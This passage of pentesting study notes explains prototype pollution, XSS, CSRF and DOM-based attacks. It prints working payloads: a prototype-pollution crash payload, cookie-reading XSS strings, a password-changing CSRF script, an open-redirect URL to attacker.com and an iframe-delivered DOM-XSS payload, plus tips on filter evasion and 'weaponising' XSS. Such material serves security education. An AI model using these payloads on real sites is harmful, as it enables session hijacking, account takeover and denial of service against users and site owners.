- An attacker can manipulate the prototype of a widely used object that may cause the application to crash. So, if an attacker pollutes the 'Object.prototype.toString' method, every subsequent call to this method by any abject will execute the altered behaviour. So, if we can try and send payload that will override an existing function like 'toString()', and then call it on some object, it will trigger an unintended behaviour for the server.

- Assuming the web application uses merge function without input sanitisation, we can easily take down the server by polluting the prototype object by a simple payload like this:

    {"__proto__": {"toString": "Just crash the server"}}
    
  As this function is universally used in JS to convert object into a string, it is an ideal candidate for testing a DoS.
  
## Automating the process:

- Unlike other security issues that could be identified by looking for specific patterns or signs, finding prototype pollution is really hard and a deep dive into the website's code is crucial. So, it is all about understanding how objects in JS can affect each other and spotting where something might go wrong. 

- Few Important Scripts:

    - NodeJsScan
    
    - Prototype Pollution Scanner
    
    - PPFuzz
    
    - BlackFan

- While looking for prototype pollution, it is very important to look for instances where user-controlled input might influence the keys or properties being merged, defined, or cloned. 

## Mitigation Measures:

- For Pentester:

    - Input Fuzzing and Manipulation
    
    - Context Analysis and Payload Injection
    
    - CSP Bypass and Payload Injection
    
    - Dependency Analysis and Exploitation
    
    - Static Code Analyis
    
- For Developers:

    - Avoid using __proto__
    
    - Immutable Objects
    
    - Encapsulation
    
    - Input Sanitisation
    
    - Dependency Management
    
    - Security Headers
    
# XSS

- Cross-site Scripting (XSS) is a vunerability that allows as attacker to inject malicious script in a website to run on a user's browser. So, an XSS attack basically exploit the user's trust in the vulnerable web application. Consequently, XSS bypass the Same-Origin-Policy (SOP), which is a security mechanism implemented in modern web browsers for preventing a malicious script from gaining access to sensitive data on another page. XSS dodges SOP as it executes from the same origin. 

- Types of XSS:

    - Reflected XSS: This attack relies on the user-controlled input which is then reflected to the user. For example, if we search for a particular term and the resulting page displays the term we searched for, then an attacker can inject a malicious script within the search term.
    
    - Stored XSS: This attack relies on the user input which is stored in the website's database. If users can write certain reviews that are stored in the database and displayed to other users, then an attacker would try to inject a malicious script in the review which will then be executed in the browsers of other users when they view the review. 
    
    - DOM-based XSS: This attack particularly exploits vulnerbailites within the Document Object Model to manipulate existing page elements without needing to be reflected or stored in the server. 
    
## Implications of XSS:

- Session Hijacking

- Social Engineering

- Content Manipulation and defacement

- Data exfiltration

- Malware installation

## Reflected XSS:

- It is often triggered through crafted URL or form submission. If we consider a search query containing '<script>alert(document.cookie)</script>, many users would not be suspicious about the URL. But if it is processed by a vulnerable web app, then it will be executed within the context of the user's browser. 

## Stored XSS:

- This type of XSS occurs when the application stores user-supplied input and later embeds it in web pages which is served to other users without proper sanitization or escaping. Some of the places for this vulnerability to exist are web forum posts, product reviews, comment sections, and other places where data are stored and can also be viewed by other users. This vulnerbility stays low until other users access this stored content which will be then executed in their browser. 

## DOM-based XSS:

- This XSS is completely browser-based and does not need to go to the server and back to the client. This XSS only targets the Document Object Model, which is a programming interface that represents a web document as a tree. The tree starts with 'document' node and then branches into 'DOCTYPE' and 'html'. The 'html' node then branches into 'head' and 'body'. Body is also branched where the actual content of a web page is displayed in elements. This branch follows a tree like structure that decides how the web page should be displayed. So, manipulating a DOM tree is the key here to achieve a DOM-based XSS. For example, we can create a new element in a DOM using 'document.createElement()' and add a child to any element using 'element.append()'.


## Context:

- If we want to inject a XSS payload, then the most suitable part to target will be between HTML tags, within HTML tags, and inside JavaScript. For this, we need to figure out where the vulnerable thing actually exists first.

- So, when XSS happens between HTML tags, we can run:

    <script>alert(document.cookie)</script>
    
- When the injection is within an HTML tag, then we need to end the HTML tag then inject out script like this:

    ><script>alert(document.cookie)</script>
    
- If the injection is possible within an existing JavaScript, then we need to end the script and continue with our payload. Here we can start with '</script> to end the script and continue from here on. If our payload gets executed within a Javascript string, then we can close the string, complete the command, and execute our command, then comment out the rest of the line like this:

    ';alert(document.cookie)//
    
- So, understanding where actually our XSS payload is being executed from is very important for the successful execution of the payload. 

## Evasion:

- There are many repositories that helps in building our own payload according to the context of the attack and the web application. If there are filters blocking the payloads, then we could bypass length restriction through various means. Evading the blocklists also have variety of tricks to choose from such as horizontal tab, a new line, or a carriage return which would break the payload and evade the detection engine. 

# CSRF

- CSRF is a type of security vulnerability where an attacker can trick a user's web browser into performing unwanted action on a trusted site where the user is authenticated. 

- Cycle of CSRF:

    - Attacker already knows the format of the web application's request and response, so they can send malicious link to the user impersonating the server.
    
    - An authenticated user clicks the link shared by the attacker. 
    
## Types of CSRF:

- Traditional CSRF:

    - This frequently concentrate on state-changing actions carried out by submitting forms. Victim will be tricked to submit a form sent by the attacker not knowing the associated data like cookies, URL parameters, etc. Then, the victim's browser sends an HTTP request to a web application form where the user is already authenticated. Crafted malicious links could be used to transfer suppose the victim's bank balance the moment the victim clicks on the link.
    
- XMLHttp Request CSRF:

    - It is an asynchronous CSRF exploitation when operations are initiated without a complete page request and response cycle. This is more likely to appear on online apps that leverage asynchronous server communication (via XMLHttpRequest ot the Fetch API) and JavaScript to produce more dynamic user interfaces. 
    
    - Suppose an online email client, where users may change their email preferences without reloading the page. If such application is CSRF vulnerable, then an attacker can simply craft a fake asynchronous HTTP request, usually a POST request, and alter the victim's email preferences, forwarding all their information to a malicious address. The steps this attack would take to succeed will look like this:
    
        - Victim opens a session saved in their browser's cookies and logs in to the email client.
        
        - Victim opens a malicious webpage sent by the attacker with a script that could actually send queries to the legit email client application.
        
        - To modify the user's email forwarding preferences, the malicious script on the attackers page will then make an AJAX call to mail.com/api/updateEmail (using the XMLHttpRequest or Fetch)
        
        - The session cookie of the application will also get included with the AJAX request in the victims browser so the server will just accept it.
        
        - After receiving the AJAX request, the email client will evaluate it and modify the victim;s settings without the user being aware of it if no CSRF defense has been applied.
        
## Techniques:

- Basic CSRF - Hidden Link/Image Exploitation:

    - An attacker will use this trick to trick the user where they inserts a 0x0 pixel image or a link into a webpage that is nearly undetected by the user. Typically, the 'src' or 'href' element of the image is set to the destination URL intended by the atacker. So, a carefully crafted link and a little bit of social engineering could lure the victim to click the link. 
    
- Double Submit Cookie Bypass:

    - A CSRF token is a unique value that is associated with a user's session which ensures each request comes from a legitimate source. So, a double submit cookies technique is an implementation where a cookie value corresponds to a value in a hidden form field. When a server receives a request, it checks that the cookie value matches the form field value.
    
    - Talking about the working mechanism of this implementation, first a token is generated when a user logs in or initiates a session by generating an unique CSRF token. This token is then sent to the user's browser both as a cookie (CSRF-Token cookie) and also embedded in hidden form fields of web forms where actions are performed (like money transfer). Upon submiting the form, two versions of the CSRF-Token are sent to the server, one in the cookie and one in the part of the form data. The server then validates both cookie to be equal, if not the request is denied.
    
    - TO bypass this strong security mechanism, we have many techniques at hand:
    
        - Session Cookie Hijacking (Man in the Middle Attack)
        
        - Subverting the Same-Origin Policy (Attacker Controlled Subdomain)
        
        - Exploiting XSS Vulnerabilities
        
        - Predicting or Intefering with Token Generation
        
        - Subdomain Cookie Injection
        
- Samesite Cookie Bypass:

    - These cookies comes with special attribute in them that are designed to control what is being sent with corss-site requests. There are three potential values for the attribute which are:
    
        - Lax: Lax SameSite cookies provide a moderate level of protection by allowing the cookies to be sent in top-level navigations and safe HTTP methods like GET, HEAD, and OPTIONS. Cookies will not be sent with cross-site POST requests which helps to mitigate certain types of CSRF attacks to some extent. But, still the cookies in the GET requests can be at risk if senstive information is stored in those cookies.
        
        - Stric: Strict SamaSite cookies are the guardian that offers the highest level of protection by restricting the cookies to be only sent in a first-party context. This means that cookies are only sent with requests originating from the same site that set the cookie.
        
        - None: None SameSite cookies are sent with both first-party and cross-site requests, making them them convinient for scenarios where cookies need to be accessible across different origins. To prevent the security risks related to to cross-site requests, they require the 'Secure' attribute if thhe request is made over HHTTPS.
        
- XMLHTTPRequest Exploitation:

    - CSRF is like someone making your browser do things without you knowing like sending a request where you are logged in. These attacks still succeed even when AJAX requests are subject to the Same-Origin-Policy (SOP), which typically forbids cross-origin requests. A simple way how an attacker can chain the information known about a web application and client to update a password on a certain application can be:
    
        <script>
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://example.com/updatepassword', true);
            xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                    alert("Action executed!");
                }
            };
            xhr.send('action=execute&parameter=value');
        </script>
    
      The XMLHttpRequest above is designed to submit form data to the server and include custom headers. The complete process of sending requests will be seamless as the requests are performed in JavaScript using AJAX.
      
- Same Origin Policy (SOP) and Cross-Origin Resource Sharing (CORS) Bypass:

    - CORS and SOP bypass to launch CSRF is like an attacker using a trick to make your web browser send requests to a different website than the one you are currently on. Under a stable CORS policy, certain requests can only be submitted by recognised origins, but misconfigurations in CORS policies can allow attackers to circumvent these limitations if they rely on origins that the atacker can control. In a CORS configuration the header 'Access-Control-Allow-Credentials' should never be set to '*'. This means it allows requests from any origin, and hence it can be vulnerable to CSRF attacks. So, ensuring to set this header to only trusted origins is a must. 
    
## Defence Mechanisms:

- CSRF plays an important role for pentesters like us which lets us simulate real world attack and chain the vulnerability to weaponize the effects of the vulnerability. So, some critical measures that are recommended for testing of such vulnerabilites are:

    - CSRF Testing: Try to actively test applications for CSRF by attempting to execute unauthorised actions through manipulated requests and assess the effectiveness of the implemented protiections.
    
    - Boundary Validation: Check for an app's validation mechanisms like if the user inputs are validated and anti-CSRF tokens are present and correctly verified to prevent request forgery.
    
    - Security Headers Analysis: Look for headers such as CORS and Referer, and test attack vectors on them to ensure their security.
    
    - Session Management Testing: Ensure the session tokens are securely generated, transmitted, and validated to prevent unauthorised access and actions.
    
    - CSRF Exploitation Scenarios: Explore with all might, embed malicious requests in image tags or exploit trusted endpoint to identify possible weakness in the applications defenses and improve security posture. 
    
# DOM-Based Attacks

- DOM refers to the Document Object Model, which is the programming interface that displays the web document. When we make a request to a web application, the HTML in the response is loaded as the DOM in the browser. Once loaded, JavaScript can interface with the DOM and make updates to changes what the user sees. DOM has a tree-like structure which allows developers to use JavaScript code to search or modify specific elements. 

## Modern Frontend frameworks:

- Back in the old days, each time a user navigated to a different section in the web application, the response provided to the request made would provide completely new HTML code, and the DOM would rebuild from the scratch. But, with time the modern frontend framework uses new web application model called the single page application (SPA). SPAs are loaded the first time a user visits the website, and all code is loaded in the DOM. Then, when using JavaScript, instead of reloading the DOM with each new request, the DOM is automatically updated with the data required to update the DOM. So, instead of the web server being responsible for DOM as well, the SPA is loaded once and then interfaces with the web server through API requests.

## DOM-Based Attacks:

- The Blind Server-Side:

    - This attack can be summarized by insufficiently validating and sanitising user input before using it in JavaScript, which will alter the DOM. In modern web applications, developers will implement functions that alter the DOM without making any new requests to the web server or API. So, as there is no need to refresh the data being shown to the user, the attack surface increases where the client-side security controls should be given a lot of priority.
    
- The Source and the Sink:

    - All DOM-based attacks initiate with untrusted user input making its way to JavaScript that modifies the DOM. So, a source is the location where untrusted user input is provided by the user to a JS function, and the sink is the location where the data is used in JS to update the DOM. 
    
- DOM-based Open Redirection:

    - Lets take a look at the following JS code that determines the location of navigation for the web app:
    
        goto = location.hash.slice(1) if (goto.startsWith('https:')) {   location = goto; }
    
      Here, the source is 'location.hash.slice(1)' parameter which will take the first '#' element in the URL. So, without proper sanitisation, this value is directly set in the location of the DOM, which is the sink. To exploit this we can construct a URL to exploit this flaw:
      
        https://example.com/#https://attacker.com
        
      Now, when the DOM loads, the Javascript will recover the '#' value of attacker's domain and perform a redirect to our malicious website. There exists many DOM-based attacks, but for every single one of them to be exploitable, the common principle is an user input directly being used in a JS element without sanitisation or validation allowing attackers to control a part of the DOM.
      
## DOM-based XSS:

- As with all DOM-based attack, we need a source and a sink to perform the atack, this attack allows us to inject JS code and take full control of the browser. The most common source for DOM-based XSS is the URL, or URL fragments which are accessed thorough the 'window.location' source. But, most modern browsers implement URL encoding on the data, which can prevent this attack. 

- DOM-based XSS via jQuery:

    - We can inject an XSS payload into jQuery's $() selector sink. Is we have access to the hash value source then, we can craft an URL to:
    
        https://example.com#<img src=1 onerror=alert(1)></img>
        
      This payload allows us to XSS ourselves, so to perform this on other users, we need to find a way to trigger the 'hashchange' function automatically. The simplest option we have is to leverage an iFrame to deliver out payload like this:
      
        <iframe src="https://example.com#" onload="this.src+='<img src=1 onerror=alert(1)>'
        
      Once the website loads, the 'src' value is updated to now include our XSS payload trigerring the 'hashchange' function and the XSS payload itlself. Several other sinks can be used to exploit a vulnerable DOM implementation. This includes normal JavaScript sinks and frameworks-specific ones such as for jQuery and Angular. The main thing to give priority is the weaponisation of DOM-based XSS, if not we are just performing a self-XSS which has no value.
      
- DOM-Based XSS vs Conventional XSS:

    - The key difference here is where the sink resides. If the untrusted user data is already injected into the sink server, and the response contains the payload, then it is conventional XSS. However, if the DOM is already loaded and then later on receives untrusted user data loaded through JS, then it is DOM-based. 
    
## XSS Weaponisation:

- To weaponise DOM-based XSS, we need to rely on the two conventional delivery methods of XSS payloads, storage and reflection. DOM-based XSS is harder to exploit because without a proper delivery method. So, we either need the web server to store out payload for later delivery or deliver the payload through reflection. As most modern web browsers encodes URL, so if the source is the URL then it can be tricky to achieve reflected XSS. So, if we perform XSS through stored user data, we need to find the sink where the data is added without sanitisation or validation. 

- To fully weaponise XSS, we first need to have knowledge of what we have at hand. Many attempts could be done for this, such as attempting to steal the user's cookie value. But, with cookie security set to HttpOnly flag, this will be ruled out easily. So, we need to realise the power we have where we can fully execute XSS and load a staged payload to control user's browser. It is very important to browser the web application as a normal user at first to gain meaningful insights. Even if we achive an XSS on a page where there is not anything sensitive, we can instruct the browser to recover information from other, more sensitive pages or to perform state-changing actions on behalf of the user. So, all we need to do is understand the web appplication's functionality and tailor our XSS payload to leverage and use the functionality to our advantage. 
    
    
    
    


    









